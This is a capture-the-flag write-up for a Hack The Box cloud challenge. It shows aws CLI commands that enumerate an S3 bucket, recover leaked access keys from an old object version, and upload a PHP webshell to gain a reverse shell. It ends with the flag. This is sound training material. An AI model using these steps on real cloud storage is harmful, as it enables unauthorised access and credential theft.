### Challenge description
Cloud challenges don't have a description. We just get an IP address and are supposed to get the flag.

A port scan reveals only port 22 and 80 open.
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/b6ad51fc-cc3f-4c43-a142-ddf9c8d2cfab)

A good looking website that doesn't seem to do anything:
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/c73191e3-ab3c-4c30-8814-a19008b85d62)

Intercepting traffic with Burpsuite, as always, I noticed it was trying to load a `main.js` file from an `s3.unveiled.htb` domain.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/48ed6942-9299-4eec-9e9e-7e2c7fdde356)

Using aws cli with my default profile, which has the creds from the AWS fortress, I was able to list the buckets. 

```bash
aws s3 ls --profile default --endpoint-url http://s3.unveiled.htb/
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/d150dca4-c6d4-4b46-b0a8-950f35cea92b)

_In this case it doesn't matter that I used those creds, this can be listed without any creds at all. However, I've encountered situations where this wasn't possible. You needed to be authenticated, it just didn't matter with what.. so I got in the habbit of always using "some" credentials when listing AWS stuff._

We can use the syntax below to list the contenxt of the `unveiled-backups` bucket:

```bash
aws s3 ls --profile default --endpoint-url http://s3.unveiled.htb/ s3://unveiled-backups
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/675045e7-c901-402a-8091-1661224dd5ca)

We can use the syntax below to recursive download everything in the bucket locally:

```bash
aws s3 cp --profile default --endpoint-url http://s3.unveiled.htb/ s3://unveiled-backups/ . --recursive
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/20786fee-2edd-4624-833a-1f0d9124fb6c)

We can copy from and to the bucket. The website was trying to reach a main.js file which doesn’t exist. We can create one with a reverse shell and upload it.

```bash
aws s3 cp main.js --profile default --endpoint-url http://s3.unveiled.htb/ s3://unveiled-backups/main.js
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/d8d0134f-a33c-4f89-841c-143325e2004b)

No callback from javascript reverse shell, when it tries to load it, we still get a 500 error. The main.tf terraform file does show that versioning is enabled:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/b2dc30a0-1e2c-4f94-b30a-5924f0d6e80f)

We can see an older version of the main.tf file:

```bash
aws s3api list-object-versions --endpoint-url http://s3.unveiled.htb/ --bucket unveiled-backups
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/15ce98b8-f96c-4067-b6dc-4d8c43a2fb62)

And copy it locally like this:

```bash
aws s3api get-object --endpoint-url http://s3.unveiled.htb/  --bucket unveiled-backups --key main.tf --version-id "589b5ec6-6780-4b0d-8e91-2d3932433e95" main.tf
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/fbf339bd-b9f3-41a7-a2d0-53a67112aa94)

This version has the keys included unlike the previous one:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/43c4ba25-8c0f-4973-a864-67d9cb190809)

We need to check what region this bucket is in so we can configure a profile:

```bash
aws s3api get-bucket-location --endpoint-url http://s3.unveiled.htb/  --bucket unveiled-backups
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/e14ad225-8464-4787-88c3-d63ea6f1f26d)

It's not region locked so we can use any region, I used us-east-2:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/15e535d7-8217-4fcd-909a-f503db195443)

We can now list the private bucket as well.

```bash
aws s3 ls --profile unveiled --endpoint-url http://s3.unveiled.htb/ s3://website-assets
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/5a8dd37c-3652-4dcc-aa49-1d837b88f1b3)

Now that we have access to this bucket, we can upload a PHP webshell since this is an Apache webserver:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/013ebe7a-af68-45bd-a5da-a1a845d4ab5b)

We can easily get a reverse shell now:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/85e59480-49ff-4e0d-bbef-08427f4212e6)

We find the flag in /var/www:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/df2dfeea-eadd-44e7-81fe-6bfddbd6e55b)  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/9b844644-76a3-4666-9161-e9959eb1e1af)

HTB{th3_r3d_pl4n3ts_cl0ud_h4s_f4ll3n}










